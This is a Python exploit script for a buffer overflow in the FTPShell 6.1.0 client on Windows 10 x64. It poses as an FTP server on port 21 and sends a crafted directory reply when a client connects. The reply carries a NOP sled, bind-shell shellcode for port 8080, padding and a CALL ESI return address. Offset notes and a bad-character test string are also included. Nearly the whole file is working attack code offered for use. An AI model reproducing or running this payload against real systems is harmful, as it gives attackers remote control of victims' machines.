#! /usr/bin/python
# -*- coding: utf-8 -*-

import socket
import sys

print """
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄       ▄  ▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄                         ▄       ▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▐░▌▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌                       ▐░▌     ▐░▌
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▐░▌   ▐░▌▐░█░█▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀                         ▐░▌   ▐░▌ 
▐░▌       ▐░▌▐░▌       ▐░▌  ▐░▌ ▐░▌ ▐░▌▐░▌    ▐░▌▐░▌       ▐░▌▐░▌                                   ▐░▌ ▐░▌  
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌   ▐░▐░▌  ▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄         ▐░▐░▌   
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌    ▐░▌   ▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌         ▐░▌    
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌   ▐░▌░▌  ▐░▌   ▐░▌ ▐░▌▐░█▀▀▀▀█░█▀▀  ▀▀▀▀▀▀▀▀▀█░▌      ▀▀▀▀▀▀▀▀▀▀▀         ▐░▌░▌   
▐░▌          ▐░▌       ▐░▌  ▐░▌ ▐░▌ ▐░▌    ▐░▌▐░▌▐░▌     ▐░▌            ▐░▌                         ▐░▌ ▐░▌  
▐░▌          ▐░▌       ▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄█░█░▌▐░▌      ▐░▌  ▄▄▄▄▄▄▄▄▄█░▌                        ▐░▌   ▐░▌ 
▐░▌          ▐░▌       ▐░▌▐░▌     ▐░▌▐░░░░░░░░░▌ ▐░▌       ▐░▌▐░░░░░░░░░░░▌                       ▐░▌     ▐░▌
 ▀            ▀         ▀  ▀       ▀  ▀▀▀▀▀▀▀▀▀   ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀                         ▀       ▀ 
 BoF FTPShell version 6.1.0 para WIN10 x64
 """
port = 21

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", port))
        s.listen(5)
        print("[+] FTP server started on port: "+str(port)+"\r\n")
except:
        print("[x] Failed to start the server on port: "+str(port)+"\r\n")
# offset 6E41336E [*] Exact match at offset 400
basura = "A" * 25
# 00450C1C  |. FFD6           CALL ESI (ftpshell.exe))
eip = "\x1c\x0c\x45"
# Badchards \x00\x0a\x0d\0x2
badchards = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
nops = "\x90" * 20
# Bind Shell port 8080
buf =  b""
buf += b"\xbb\xbb\xd5\xb0\x12\xdb\xdc\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x53\x83\xef\xfc\x31\x5f\x0e\x03\xe4\xdb\x52"
buf += b"\xe7\xe6\x0c\x10\x08\x16\xcd\x75\x80\xf3\xfc\xb5\xf6"
buf += b"\x70\xae\x05\x7c\xd4\x43\xed\xd0\xcc\xd0\x83\xfc\xe3"
buf += b"\x51\x29\xdb\xca\x62\x02\x1f\x4d\xe1\x59\x4c\xad\xd8"
buf += b"\x91\x81\xac\x1d\xcf\x68\xfc\xf6\x9b\xdf\x10\x72\xd1"
buf += b"\xe3\x9b\xc8\xf7\x63\x78\x98\xf6\x42\x2f\x92\xa0\x44"
buf += b"\xce\x77\xd9\xcc\xc8\x94\xe4\x87\x63\x6e\x92\x19\xa5"
buf += b"\xbe\x5b\xb5\x88\x0e\xae\xc7\xcd\xa9\x51\xb2\x27\xca"
buf += b"\xec\xc5\xfc\xb0\x2a\x43\xe6\x13\xb8\xf3\xc2\xa2\x6d"
buf += b"\x65\x81\xa9\xda\xe1\xcd\xad\xdd\x26\x66\xc9\x56\xc9"
buf += b"\xa8\x5b\x2c\xee\x6c\x07\xf6\x8f\x35\xed\x59\xaf\x25"
buf += b"\x4e\x05\x15\x2e\x63\x52\x24\x6d\xec\x97\x05\x8d\xec"
buf += b"\xbf\x1e\xfe\xde\x60\xb5\x68\x53\xe8\x13\x6f\x94\xc3"
buf += b"\xe4\xff\x6b\xec\x14\xd6\xaf\xb8\x44\x40\x19\xc1\x0e"
buf += b"\x90\xa6\x14\xba\x98\x01\xc7\xd9\x65\xf1\xb7\x5d\xc5"
buf += b"\x9a\xdd\x51\x3a\xba\xdd\xbb\x53\x53\x20\x44\x44\x34"
buf += b"\xad\xa2\x10\x24\xf8\x7d\x8c\x86\xdf\xb5\x2b\xf8\x35"
buf += b"\xee\xdb\xb1\x5f\x29\xe4\x41\x4a\x1d\x72\xca\x99\x99"
buf += b"\x63\xcd\xb7\x89\xf4\x5a\x4d\x58\xb7\xfb\x52\x71\x2f"
buf += b"\x9f\xc1\x1e\xaf\xd6\xf9\x88\xf8\xbf\xcc\xc0\x6c\x52"
buf += b"\x76\x7b\x92\xaf\xee\x44\x16\x74\xd3\x4b\x97\xf9\x6f"
buf += b"\x68\x87\xc7\x70\x34\xf3\x97\x26\xe2\xad\x51\x91\x44"
buf += b"\x07\x08\x4e\x0f\xcf\xcd\xbc\x90\x89\xd1\xe8\x66\x75"
buf += b"\x63\x45\x3f\x8a\x4c\x01\xb7\xf3\xb0\xb1\x38\x2e\x71"
buf += b"\xc1\x72\x72\xd0\x4a\xdb\xe7\x60\x17\xdc\xd2\xa7\x2e"
buf += b"\x5f\xd6\x57\xd5\x7f\x93\x52\x91\xc7\x48\x2f\x8a\xad"
buf += b"\x6e\x9c\xab\xe7"

payload = nops + buf + basura + eip

while True:
    conn, addr = s.accept()
    conn.send('220 FTP Server\r\n')
    print(conn.recv(1024))
    conn.send("331 OK\r\n")
    print(conn.recv(1024))
    conn.send('230 OK\r\n')
    print(conn.recv(1024))
    conn.send('220 "'+payload+'" is current directory\r\n')
